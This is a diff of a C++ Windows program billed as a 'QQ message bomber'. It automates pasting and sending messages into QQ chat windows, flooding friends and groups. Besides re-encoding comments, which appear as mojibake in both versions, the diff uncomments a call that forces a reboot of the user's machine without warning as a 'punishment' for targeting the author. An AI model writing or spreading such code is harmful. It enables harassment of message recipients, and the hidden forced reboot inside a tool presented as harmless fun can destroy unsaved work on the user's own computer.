@@ -1,11 +1,11 @@
-// PostMsgDemo.cpp : ¶¨Òå¿ØÖÆÌ¨Ó¦ÓÃ³ÌĞòµÄÈë¿Úµã¡£
-//SendMessage(´°¿Ú¾ä±ú£¬·¢ËÍÄÇ¸öÏûÏ¢£¬¸½¼Ó²ÎÊı£¬¸½¼Ó²ÎÊı);
-//::SendMessage(hSend, WM_CHAR, 49, 0);  ·¢ËÍ 1
-//QQÏûÏ¢ºäÕ¨
-//1¡¢Ä£Äâ·¢ËÍ sendmessage ÏµÍ³µÄAPI
-//2¡¢·¢ËÍÊ²Ã´¶«Î÷
-//3¡¢·¢ËÍµ½ÄÄÀï
-//Í¨¹ı»Ø³µ´ò¿ªÏÂÒ»¸öQQ´°¿Ú
+// PostMsgDemo.cpp : å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚
+//SendMessage(çª—å£å¥æŸ„ï¼Œå‘é€é‚£ä¸ªæ¶ˆæ¯ï¼Œé™„åŠ å‚æ•°ï¼Œé™„åŠ å‚æ•°);
+//::SendMessage(hSend, WM_CHAR, 49, 0);  å‘é€ 1
+//QQæ¶ˆæ¯è½°ç‚¸
+//1ã€æ¨¡æ‹Ÿå‘é€ sendmessage ç³»ç»Ÿçš„API
+//2ã€å‘é€ä»€ä¹ˆä¸œè¥¿
+//3ã€å‘é€åˆ°å“ªé‡Œ
+//é€šè¿‡å›è½¦æ‰“å¼€ä¸‹ä¸€ä¸ªQQçª—å£
 //#include "stdafx.h"
 #include <windows.h>
 #include <stdio.h>
@@ -16,26 +16,26 @@
 
 static int boom_count = 0;
 
-BOOL SystemReboot()		//ÌáÈ¨
+BOOL SystemReboot()		//ææƒ
 {
 	HANDLE hToken;
 	TOKEN_PRIVILEGES tkp;
-	/* OpenProcessToken() Õâ¸öº¯ÊıµÄ×÷ÓÃÊÇ´ò¿ªÒ»¸ö½ø³ÌµÄ·ÃÎÊÁîÅÆ
-	GetCurrentProcess() º¯ÊıµÄ×÷ÓÃÊÇµÃµ½±¾½ø³ÌµÄ¾ä±ú*/
+	/* OpenProcessToken() è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œ
+	GetCurrentProcess() å‡½æ•°çš„ä½œç”¨æ˜¯å¾—åˆ°æœ¬è¿›ç¨‹çš„å¥æŸ„*/
 	if (!OpenProcessToken(GetCurrentProcess(),
 		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 		return FALSE;
-	// LookupPrivilegeValue() µÄ×÷ÓÃÊÇĞŞ¸Ä½ø³ÌµÄÈ¨ÏŞ
+	// LookupPrivilegeValue() çš„ä½œç”¨æ˜¯ä¿®æ”¹è¿›ç¨‹çš„æƒé™
 	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,
 		&tkp.Privileges[0].Luid);
-	tkp.PrivilegeCount = 1; // one privilege to set ¸³¸ø±¾½ø³ÌÌØÈ¨
+	tkp.PrivilegeCount = 1; // one privilege to set èµ‹ç»™æœ¬è¿›ç¨‹ç‰¹æƒ
 	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	// AdjustTokenPrivileges£¨£©µÄ×÷ÓÃÊÇÍ¨ÖªWindows NTĞŞ¸Ä±¾½ø³ÌµÄÈ¨Àû
+	// AdjustTokenPrivilegesï¼ˆï¼‰çš„ä½œç”¨æ˜¯é€šçŸ¥Windows NTä¿®æ”¹æœ¬è¿›ç¨‹çš„æƒåˆ©
 	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,
 		(PTOKEN_PRIVILEGES)NULL, 0);
-	if (GetLastError() != ERROR_SUCCESS) //Ê§°Ü
+	if (GetLastError() != ERROR_SUCCESS) //å¤±è´¥
 		return FALSE;
-	if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0)) //²ÎÊıÔÚÕâÀïÉèÖÃ¡£Ç¿ĞĞÍË³öWINDOWS£¨EWX_FORCE£©¡£
+	if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0)) //å‚æ•°åœ¨è¿™é‡Œè®¾ç½®ã€‚å¼ºè¡Œé€€å‡ºWINDOWSï¼ˆEWX_FORCEï¼‰ã€‚
 		return FALSE;
 	return TRUE;
 }
@@ -44,7 +44,7 @@ BOOL SystemReboot()		//ÌáÈ¨
 BOOL CALLBACK EnumWindowProc(HWND hwnd,LPARAM param)
 {
 	
-	//ÅĞ¶ÏÊÇ·ñÊÇQQÁÄÌì´°¿Ú £¬ÊÇ ¾Í·¢ËÍ
+	//åˆ¤æ–­æ˜¯å¦æ˜¯QQèŠå¤©çª—å£ ï¼Œæ˜¯ å°±å‘é€
 	char strClassName[MAXBYTE] = { 0 };
 	char strWindowsName[MAXBYTE] = { 0 };
 
@@ -52,47 +52,47 @@ BOOL CALLBACK EnumWindowProc(HWND hwnd,LPARAM param)
 	GetWindowTextA(hwnd, strWindowsName, MAXBYTE);
 
 
-	//	MessageBoxA(nullptr, strWindowsName, "·¢ÏÖQQÁÄÌì´°¿Ú", MB_OK);
+	//	MessageBoxA(nullptr, strWindowsName, "å‘ç°QQèŠå¤©çª—å£", MB_OK);
 
 	if (0==strcmp("TXGuiFoundation",strClassName) )
 	{
 		if (0 == strcmp("*****", strWindowsName) ||
 				0 == strcmp("1033800341", strWindowsName) ||
 				0 == strcmp("**********", strWindowsName) ||
-				0 == strcmp(" ¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡", strWindowsName) 
+				0 == strcmp(" ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€", strWindowsName) 
 			)
 		{
 			//	::PostMessageW(hwnd, WM_PASTE, 0, 0);
-			//	::PostMessageW(hwnd, WM_KEYDOWN, VK_RETURN, 0);	//·¢ËÍ	
+			//	::PostMessageW(hwnd, WM_KEYDOWN, VK_RETURN, 0);	//å‘é€	
 			boom_count++;
 
 			MessageBoxA(nullptr, "\
-´íÎó£¬²»ÄÜºäÕ¨Ö÷ÈË \n\
-ÄãµÃĞ¡ĞÄÅ¶£¬Èç¹û¸ÒºäÕ¨Ö÷ÈË\n\
-ÄãµÄµçÄÔ»á·¢ÉúÊ²Ã´ÊÂ\n\
-ÎÒ¾Í²»ÖªµÀÁË\n\
-Ç§Íò²»ÒªºäÕ¨×÷Õß\n\
-»á±¬Õ¨µÄ Boooooooooom\n\
- ","¾¯¸æ", MB_OK);
+é”™è¯¯ï¼Œä¸èƒ½è½°ç‚¸ä¸»äºº \n\
+ä½ å¾—å°å¿ƒå“¦ï¼Œå¦‚æœæ•¢è½°ç‚¸ä¸»äºº\n\
+ä½ çš„ç”µè„‘ä¼šå‘ç”Ÿä»€ä¹ˆäº‹\n\
+æˆ‘å°±ä¸çŸ¥é“äº†\n\
+åƒä¸‡ä¸è¦è½°ç‚¸ä½œè€…\n\
+ä¼šçˆ†ç‚¸çš„ Boooooooooom\n\
+ ","è­¦å‘Š", MB_OK);
 
 			if (boom_count > 5)
 			{
 				MessageBoxA(nullptr, "\
-ËµÁË²»ÄÜºäÕ¨×÷Õß\n\
-ÄãÆ«ÒªºäÕ¨\n\
-²»Ìı»°µÄº¢×ÓÊÇÃ»ºÃ¹û×Ó³ÔµÄ\n\
-½ÓÏÂÀ´½ÓÊÜ³Í·£°É\n\
+è¯´äº†ä¸èƒ½è½°ç‚¸ä½œè€…\n\
+ä½ åè¦è½°ç‚¸\n\
+ä¸å¬è¯çš„å­©å­æ˜¯æ²¡å¥½æœå­åƒçš„\n\
+æ¥ä¸‹æ¥æ¥å—æƒ©ç½šå§\n\
 ", "^-^^-^^-^", MB_OK);
 
-	//			SystemReboot();		//ÖØÆô
+				SystemReboot();		//é‡å¯
 
 			}
 		}
 		else
 		{
 			::SendMessage(hwnd, WM_PASTE, 0, 0);
-			::SendMessage(hwnd, WM_KEYDOWN, VK_RETURN, 0);	//·¢ËÍ
-			//¹Ø±Õ´°¿Ú
+			::SendMessage(hwnd, WM_KEYDOWN, VK_RETURN, 0);	//å‘é€
+			//å…³é—­çª—å£
 			//	::SendMessage(hwnd, WM_CLOSE, 0, 0);
 		}
 	}
@@ -104,39 +104,39 @@ BOOL CALLBACK EnumWindowProc(HWND hwnd,LPARAM param)
 
 int _tmain(int argc, _TCHAR* argv[])
 {
-	system("title QQÏûÏ¢ºäÕ¨»ú---Ò»ÑÔ²»ºÏ¾ÍºäÕ¨ Beta°æ ");
+	system("title QQæ¶ˆæ¯è½°ç‚¸æœº---ä¸€è¨€ä¸åˆå°±è½°ç‚¸ Betaç‰ˆ ");
     int number=0,count=0;
 	int passkey=0;
 	
-	//FindWindowA(ÀàÃû£¬´°¿Ú±êÌâ)
-	//´ò¿ªQQºÃÓÑ¶Ô»°¿ò£¬²¢ÏÔÊ¾
+	//FindWindowA(ç±»åï¼Œçª—å£æ ‡é¢˜)
+	//æ‰“å¼€QQå¥½å‹å¯¹è¯æ¡†ï¼Œå¹¶æ˜¾ç¤º
 	HWND hwnd =:: FindWindow(L"TXGuiFoundation",L"QQ");
 	ShowWindow(hwnd, SW_SHOW);
 	system("Color  a");
 
 	MessageBoxA(nullptr, "\
-O(¡É_¡É)O¹ş¹ş¹ş~\n\
-Èç¹ûÓĞÊ²Ã´ÊÂ\n\
-Ç§Íò±ğÕÒÎÒ\n\
-±¾Èí¼ş´¿ÊôÓéÀÖ\n\
-±¾Èí¼şÒªÃØÔ¿£¬ÇëÏò×÷ÕßË÷Òª\n\
-", "ÃâÔğÉùÃ÷", MB_OK);
+O(âˆ©_âˆ©)Oå“ˆå“ˆå“ˆ~\n\
+å¦‚æœæœ‰ä»€ä¹ˆäº‹\n\
+åƒä¸‡åˆ«æ‰¾æˆ‘\n\
+æœ¬è½¯ä»¶çº¯å±å¨±ä¹\n\
+æœ¬è½¯ä»¶è¦ç§˜é’¥ï¼Œè¯·å‘ä½œè€…ç´¢è¦\n\
+", "å…è´£å£°æ˜", MB_OK);
 
-	if (MessageBoxA(nullptr, "ÊÇ·ñÏò×÷ÕßË÷ÒªÃØÔ¿", "´¿ÊôÓéÀÖ", MB_YESNO) == IDYES)
+	if (MessageBoxA(nullptr, "æ˜¯å¦å‘ä½œè€…ç´¢è¦ç§˜é’¥", "çº¯å±å¨±ä¹", MB_YESNO) == IDYES)
 	{
 		system("start tencent://Message/?Uin=1033800341&webssiteName=www.oicqzone.com&Menu=yes");
 		system("cls");
 
-		printf("ÊäÈëÃØÔ¿£º");
+		printf("è¾“å…¥ç§˜é’¥ï¼š");
 		scanf_s("%d", &passkey);
-		printf("\nÄãÊäÈëµÄÃØÔ¿Îª£º%d\n",passkey);
+		printf("\nä½ è¾“å…¥çš„ç§˜é’¥ä¸ºï¼š%d\n",passkey);
 		if (234789==passkey)
 		{
-			MessageBoxA(nullptr, "ÃØÔ¿ÕıÈ·\n", "¹§Ï²Äã^-^", MB_OK);
+			MessageBoxA(nullptr, "ç§˜é’¥æ­£ç¡®\n", "æ­å–œä½ ^-^", MB_OK);
 		}
 		else
 		{
-			MessageBoxA(nullptr, "ÃØÔ¿´íÎó£¬ÔÙ¼û£¡\n", "/(¨Òo¨Ò)/~~", MB_OK);
+			MessageBoxA(nullptr, "ç§˜é’¥é”™è¯¯ï¼Œå†è§ï¼\n", "/(ã„’oã„’)/~~", MB_OK);
 			return 0;
 		}
 		
@@ -149,25 +149,25 @@ O(¡É_¡É)O¹ş¹ş¹ş~\n\
 	}
 	
 again:
-	printf("ÊäÈëÒªºäÕ¨ºÃÓÑµÄ¸öÊı£º%d\n", &number);
-	printf("ºäÕ¨µÄºÃÓÑ»òÕßQQÈº¸öÊı:");
+	printf("è¾“å…¥è¦è½°ç‚¸å¥½å‹çš„ä¸ªæ•°ï¼š%d\n", &number);
+	printf("è½°ç‚¸çš„å¥½å‹æˆ–è€…QQç¾¤ä¸ªæ•°:");
 	scanf_s("%d", &number);
 	
-	printf("Ã¿¸öºÃÓÑ»òÕßQQÈººäÕ¨µÄ´ÎÊı£º");
+	printf("æ¯ä¸ªå¥½å‹æˆ–è€…QQç¾¤è½°ç‚¸çš„æ¬¡æ•°ï¼š");
 	scanf_s("%d",&count);
 
-	printf("ÒªºäÕ¨ %d ¸öºÃÓÑ£¬Ã¿¸öºÃÓÑºäÕ¨ %d ´Î\n", number, count);
-	printf("×£ÄãÍæµÃ¿ªĞÄ^-^\n\n");
+	printf("è¦è½°ç‚¸ %d ä¸ªå¥½å‹ï¼Œæ¯ä¸ªå¥½å‹è½°ç‚¸ %d æ¬¡\n", number, count);
+	printf("ç¥ä½ ç©å¾—å¼€å¿ƒ^-^\n\n");
 
-	//ÕÒµ½Ò»¸öºÃÓÑºó°´»Ø³µ
-	//°´ÏÂ¼ü °´»Ø³µ
+	//æ‰¾åˆ°ä¸€ä¸ªå¥½å‹åæŒ‰å›è½¦
+	//æŒ‰ä¸‹é”® æŒ‰å›è½¦
 	while (hwnd)
 	{
 		while (number--)
 		{
 		//	::SendMessage(hwnd, WM_KEYDOWN, VK_DOWN, 0);
 			::SendMessage(hwnd, WM_KEYDOWN, VK_RETURN, 0);
-			//·¢ËÍ
+			//å‘é€
 			for (int i = 0; i < count;i++)
 				EnumWindows(EnumWindowProc, NULL);
 			::SendMessage(hwnd, WM_KEYDOWN, VK_DOWN, 0);
@@ -176,19 +176,19 @@ again:
 		break;	
 	}
 		
-	if (MessageBoxA(nullptr, "ÊÇ·ñ¼ÌĞøºäÕ¨", "Boooooooom", MB_YESNO) == IDYES)
+	if (MessageBoxA(nullptr, "æ˜¯å¦ç»§ç»­è½°ç‚¸", "Boooooooom", MB_YESNO) == IDYES)
 	{
-		MessageBoxA(nullptr, "×£ÄãÍæµÃ¿ªĞÄÍæµÃÓä¿ì", "´¿ÊôÓéÀÖ", MB_OK);
+		MessageBoxA(nullptr, "ç¥ä½ ç©å¾—å¼€å¿ƒç©å¾—æ„‰å¿«", "çº¯å±å¨±ä¹", MB_OK);
 		system("cls");
 		goto again;
 	}
 	else
 	{
-		MessageBoxA(nullptr, "Ğ»Ğ»ÄúµÄÌåÑé£¬Èç¹ûÓĞ¸üºÃµÄ½¨Òé\n\
-»òÕß±¾Èí¼şÓĞ±ÌÓÍ¼¦ÇëÁªÏµ:\n\
+		MessageBoxA(nullptr, "è°¢è°¢æ‚¨çš„ä½“éªŒï¼Œå¦‚æœæœ‰æ›´å¥½çš„å»ºè®®\n\
+æˆ–è€…æœ¬è½¯ä»¶æœ‰ç¢§æ²¹é¸¡è¯·è”ç³»:\n\
 						 						-----1033800341", "", MB_OK);
 
-		if (MessageBoxA(nullptr, "ÊÇ·ñÁªÏµ×÷Õß", "´¿ÊôÓéÀÖ", MB_YESNO) == IDYES)
+		if (MessageBoxA(nullptr, "æ˜¯å¦è”ç³»ä½œè€…", "çº¯å±å¨±ä¹", MB_YESNO) == IDYES)
 		{
 			system("start tencent://Message/?Uin=1033800341&websiteName=www.oicqzone.com&Menu=yes");
 			system("cls");
